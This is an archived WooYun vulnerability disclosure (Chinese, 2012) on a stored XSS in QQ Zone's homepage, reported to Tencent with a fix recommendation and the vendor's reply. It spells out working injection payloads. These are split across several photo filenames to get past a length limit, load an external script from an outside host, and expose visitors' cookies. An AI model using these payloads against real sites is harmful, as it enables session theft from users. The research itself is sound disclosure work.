@@ -1,0 +1,318 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ空间个人首页一处比较隐蔽的存储型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ空间个人首页一处比较隐蔽的存储型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-05-24 16:54</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-05-24：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-05-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-04：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-14：	细节向普通白帽子公开<br/>
+									2012-06-24：	细节向实习白帽子公开<br/>
+									2012-07-08：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一处比较隐蔽的存储型XSS，个人首页的，通杀IE，Chrome,Firfox, 至于危害和利用，就不多说了。 主要和大家分享下思路。<br />
+<br />
+这篇《突破xss字符限制执行任意js》相信很多人都看过，其实里面的一些思路，会将一个存储型的XSS，变成了一个需要在地址栏写入代码的XSS，效果就大打折扣了。<br />
+<br />
+本次分析中，也遇到了输入长度受限的问题，实际可以输入脚本的长度，在21个长度，要保证存储型XSS的效果，怎么突破呢？见详细说明。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. QQ空间模板选择为【社交元素】<br />
+<br />
+<br />
+<br />
+2. 可见此模板右侧有【最新照片】，鼠标移到照片上的时候，会有照片的名称。 F12打开浏览器的开发工具，查看照片的HTML代码。&lt;a title=&quot;照片名称&quot; ... &lt;img alt=&quot;照片名称&quot;<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/241646224df6d0cd0089f4c10ee1bb6e5fb00873.jpg" target="_blank"><img src="../images/241646224df6d0cd0089f4c10ee1bb6e5fb00873.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 然后我们猜想下，这里的照片名称，如果双引号没过滤，会怎么样？ 可能会出现下面的情况。&lt;img alt=&quot;照片名称&quot; onload=&quot;alert(1)&quot; &quot;<br />
+<br />
+<br />
+<br />
+4. 接着我们上传一个新照片，经过研究上传的数据，可知：【照片名称】由上传时候的Filename字段控制。 （上传页面：http://up.photo.qq.com/cgi-bin/upload/cgi_upload_activex?g_tk=321835484）<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/24162801fab4eedc378ec979b9c8bced0f6fb1f2.jpg" target="_blank"><img src="../images/24162801fab4eedc378ec979b9c8bced0f6fb1f2.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 由于我用的抓包工具对于上传图片类的数据发包不给力，我们保存下发送的数据，修改Filename字段，改为 &quot;onload=&quot;alert(1)&quot;a=用nc提交下，没有返回错误，说明Filename没做过滤设置。 提交之后，我们刷新QQ空间，会发现弹出了1，说明Filename没有过滤双引号，正如我们之前所猜测的一样。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/241628562da76b158d3cd492a30d493baa7cd85e.jpg" target="_blank"><img src="../images/241628562da76b158d3cd492a30d493baa7cd85e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6. 接下来的目标，是加载任意外部JS文件。但是我们在Filename字段写入123456789012345678901234567890123456789012345678901234567890会发现，这里的名字会有30个长度的字符限制。除去&quot;onload=&quot;这9个字符，留给我们的还有21个字符，该如何调用外部JS呢。。。。<br />
+<br />
+<br />
+<br />
+7. 第一个想到的方案是eval(g_diyTitle), 因为我记得之前g_diyTitle是可以随便写入内容的，不如人意的是，腾讯在某次更新中，已经对g_diyTitle做出了限制，不允许\%,（这些字符了。这个只好暂时放弃了<br />
+<br />
+<br />
+<br />
+8. 第二个方案： 可以看到右边可以放4个图，我们可以通过控制4个图的alt属性合在一起来实现我们的目的。这里需要注意的是img标签外层有一个a标签，a标签的title属性和img的alt属性都是使用的的照片名称，当我们向alt里注入id=&quot;r&quot;的时候，a标签也加上了id=&quot;r&quot;，同时a标签比img标签先加载，导致这里我们 $(&quot;r&quot;) 得到的是 a 标签，而不是img标签。<br />
+<br />
+<br />
+<br />
+构建以下本地测试模型：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;img src=&quot;http://www.baidu.com/img/baidu_sylogo1.gif&quot; title=&quot;&quot;r=&quot;a($(&#039;s&#039;).r+$(&#039;r&#039;).r)&quot;id=&quot;t&quot;&gt;&lt;/img&gt;<br />
+&lt;img src=&quot;http://www.baidu.com/img/baidu_sylogo1.gif&quot; title=&quot;&quot;r=&quot;QZFL.imports(&#039;//xsst&quot;id=&quot;s&quot;&gt;&lt;/img&gt;<br />
+&lt;img src=&quot;http://www.baidu.com/img/baidu_sylogo1.gif&quot; title=&quot;&quot;r=&quot;.sinaapp.com/m.js&#039;)&quot;id=&quot;r&quot;&gt;&lt;/img&gt;<br />
+&lt;img src=&quot;http://www.baidu.com/img/baidu_sylogo1.gif&quot; title=&quot;&quot;onload=&quot;a=eval;a($(&#039;t&#039;).r)&quot;&gt;&lt;/img&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+实际利用步骤：<br />
+<br />
+<br />
+<br />
+我们只需要分4次，分别上传4个图，图片名称依次是<br />
+<br />
+<br />
+<br />
+</p><pre><code>1. &quot;onload=&quot;a=eval;a($(&#039;t&#039;).r)<br />
+2. &quot;r=&quot;.sinaapp.com/m.js&#039;)&quot;id=&quot;r<br />
+3. &quot;r=&quot;QZFL.imports(&#039;//xsst&quot;id=&quot;s<br />
+4. &quot;r=&quot;a($(&#039;s&#039;).r+$(&#039;r&#039;).r)&quot;id=&quot;t</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+刷新QQ空间， 可以看到，在上传4个图之后，成功弹出了 cookies。 <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/241632435fa9d528a4ec65cfd723ce15a7bb3256.jpg" target="_blank"><img src="../images/241632435fa9d528a4ec65cfd723ce15a7bb3256.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+9. 这个方案是可以运行了，但是仅支持IE8及以下，原因是其它版本或其它浏览器，对自定义属性的获取，必须通过$(&quot;x&quot;).getAttribute(&quot;属性名&quot;)来获取。<br />
+<br />
+<br />
+<br />
+    为了让我们这个漏洞的普适性更好。我们还是得想到更好的办法来。eval(某个可写的JS变量)比较靠谱，可是QQ空间的开发人员把变量名都写的挺长，根本塞不进去。 （= = 看来，编程的时候，变量名字长，也能提高安全性）， 不过我们还是可以变通一下的，见下文。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+10，第三个方案：一个新的XSS方案: (g_userProfile.desc 为QQ空间自定义变量)<br />
+<br />
+<br />
+<br />
+本地测试模型如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;img src=&quot;http://www.baidu.com/img/baidu_sylogo1.gif&quot; title=&quot;eval(g_userProfile.desc)&quot;id=&quot;t&quot;&gt;&lt;/img&gt;<br />
+&lt;img src=&quot;http://www.baidu.com/img/baidu_sylogo1.gif&quot; title=&quot;&quot;onload=&quot;eval($(&#039;t&#039;).title)&quot;&gt;&lt;/img&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+模型说明：<br />
+<br />
+ <br />
+<br />
+因为onload里可以写入代码的长度很短，无法直接eval(g_userProfile.desc)，因而我们用$(&#039;t&#039;).title做了一次中转，然后双重eval，即可运行g_userProfile.desc里的JS代码。<br />
+<br />
+<br />
+<br />
+利用步骤：<br />
+<br />
+A. 编辑空间名称下面的描述（g_userProfile.desc），改为：QZFL.imports(&#039;//xsst.sinaapp.com/m.js&#039;)<br />
+<br />
+B. 插入以下2张图，图片名称依次是:<br />
+<br />
+<br />
+<br />
+</p><pre><code>1. &quot;onload=&quot;eval($(&#039;t&#039;).title)<br />
+2. eval(g_userProfile.desc)&quot;id=&quot;t</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+上传完毕后，这次我们打开 Chrome, 以访客身份来看看， 我们可以看到，成功弹出了cookies，FF一样可行。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/241635177fde5e02747f876472a8ebe28d8b3fd8.jpg" target="_blank"><img src="../images/241635177fde5e02747f876472a8ebe28d8b3fd8.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+------------------<br />
+<br />
+<br />
+<br />
+That&#039;s all !<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明。<br />
+<br />
+<br />
+<br />
+测试操作系统：Win7<br />
+<br />
+<br />
+<br />
+浏览器：IE系列， Chrome, FF 均成功。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对上传页面 http://up.photo.qq.com/cgi-bin/upload/cgi_upload_activex 里的Filename字段做限制，过滤\w之外的字符，因为文件名称本来就不需要特殊字符。其它字段是否存在类似危险未知，可以一并考虑。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07489" title="QQ空间个人首页一处比较隐蔽的存储型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-05-25 21:49</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。<br />
+<br />
+Qzone中此类存储型XSS我们认定为高风险，一般给15分。<br />
+考虑到报告者有非常详尽的分析以及探索精神，我们非常赞同。<br />
+给20分的rank鼓励，再次感谢。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7489";
+var bugRating="2";
+var myRating="";
+var ratingCount="11";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
